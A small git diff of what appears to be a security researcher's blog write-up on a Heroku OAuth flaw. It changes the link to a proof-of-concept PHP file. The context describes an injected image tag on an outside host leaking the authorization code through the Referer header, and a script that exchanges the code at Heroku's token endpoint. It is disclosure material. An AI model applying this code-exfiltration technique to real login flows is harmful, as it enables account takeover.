@@ -69,7 +69,7 @@ Only worked if the user was already authenticated.
 6. The `<img src="https://u00f1.xyz/heroku/poc.php">` is created and the "image" is loaded, sending the __code__ in the `Referer`
     ![10]({{ site.github.url }}/screenshots/2016-06-01-10.png)
 
-7. My file <a href="{{ site.github.url }}/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 
+7. My file <a href="https://github.com/esevece/esevece.github.io/blob/master/code/2016-06-01-poc.php" target="_blank">poc.php</a> captures the `Referer`, extracts the __code__ and makes a POST request to 
 
         https://longboard.heroku.com/login/token
 
